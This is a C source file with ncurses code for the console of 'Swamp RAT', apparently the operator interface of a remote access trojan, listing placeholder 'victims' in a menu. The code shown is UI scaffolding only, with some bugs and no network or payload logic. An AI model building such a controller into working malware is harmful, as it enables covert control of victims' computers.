/*-----------------------------------------------------------------------\
| Copyright (C) 2018  Lilly Chalupowski                                  |
|                                                                        |
| This program is free software: you can redistribute it and/or modify   |
| it under the terms of the GNU General Public License as published by   |
| the Free Software Foundation, either version 3 of the License, or      |
| (at your option) any later version.                                    |
|                                                                        |
| This program is distributed in the hope that it will be useful,        |
| but WITHOUT ANY WARRANTY; without even the implied warranty of         |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          |
| GNU General Public License for more details.                           |
|                                                                        |
| You should have received a copy of the GNU General Public License      |
| along with this program.  If not, see <https://www.gnu.org/licenses/>. |
\-----------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <ncurses.h>
#include <menu.h>
#include <errno.h>

#define ARRAY_SIZE(a)(sizeof(a) / sizeof(a[0]))

bool ncurses_window_cleanup(WINDOW *win){
  /*
    :TODO: clean up window
    :returns: boolean
  */
  delwin(win);
  endwin();
  refresh();
  return true;
}

bool ncurses_window_border(WINDOW *win){
  /*
    :TODO: draw window border
    :returns: boolean
  */
  box(win, 0, 0);
  wrefresh(win);
  return true;
}

bool ncurses_window_title(WINDOW *win, char *title){
  /*
    :TODO: draw window title
    :win: pointer to window struct
    :title: title of window
    :returns: boolean
  */
  int x, y;
  getmaxyx(win, y, x);
  mvprintw(0, ((x/2) - (strlen(title)/2)), title);
  wrefresh(win);
  return true;
}

#ifndef NCURSES_MAIN_WIN_COLOR
#define NCURSES_MAIN_WIN_COLOR 1
#endif

bool ncurses_main(){
  /*
    :TODO: initalize main window
    :returns: boolean
  */
  int key, n_victims;
  WINDOW *win_victims;
  WINDOW *win_main;
  MENU *menu_victims;
  ITEM **item_victims;
  char win_main_title[] = "|Swamp RAT|";
  char *victims[] = { "user 0", "user 1", (char *)NULL};
  
  if(putenv("TERM=linux") != 0){
    fprintf(stderr, "[x] %s\n", strerror(errno));
    return false;
  }
  
  if ((win_main = initscr()) == NULL){
    fprintf(stderr, "[x] %s\n", strerror(errno));
    return false;
  }

  if (start_color() == ERR || !has_colors() || !can_change_color()){
    ncurses_window_cleanup(win_main);
    fprintf(stderr, "[x] %s\n", strerror(errno));
    return false;
  }

  // create victim items
  n_victims = ARRAY_SIZE(victims);
  item_victims = (ITEM **)calloc(n_victims + 1, sizeof(ITEM *));
  for (int i = 0; i < n_victims; i++){
    item_victims[i] = new_item(victims[i], victims[i]);
  }
  item_victims[n_victims] = (ITEM *)NULL;

  // create victim menu
  menu_victims = new_menu((ITEM **)item_victims);

  // create window for victims menu
  win_victims = newwin(10, 40, 4, 4);

  // set menu window
  set_menu_win(menu_victims, win_victims);
  set_menu_sub(menu_victims, derwin(win_victims, 6, 38, 3, 1));

  // set menu mark
  set_menu_mark(menu_victims, " * ");

  // menu border
  ncurses_window_border(win_victims);

  // post menu
  post_menu(menu_victims);
  wrefresh(win_victims);

  init_pair(NCURSES_MAIN_WIN_COLOR, COLOR_GREEN, COLOR_BLACK);
  wbkgd(win_main, COLOR_PAIR(NCURSES_MAIN_WIN_COLOR));

  ncurses_window_border(win_main);
  ncurses_window_title(win_main, win_main_title);

  win_victims = newwin(10, 10, 30, 15);

  while ((key = getch()) != 27){
    if (key == KEY_RESIZE){
      clear();
      ncurses_window_border(win_main);
      ncurses_window_title(win_main, win_main_title);
    }
    if (key == KEY_DOWN){
      menu_driver(menu_victims, REQ_DOWN_ITEM);
    }
    if (key == KEY_UP){
      menu_driver(menu_victims, REQ_UP_ITEM);
    }
    wrefresh(win_main);
  }

  // cleanup
  unpost_menu(menu_victims);
  free_menu(menu_victims);
  for(int i = 0; i < n_victims; ++i){
    free_item(item_victims[i]);
  }
  ncurses_window_cleanup(win_victims);
  ncurses_window_cleanup(win_main);
  
  return true;
}
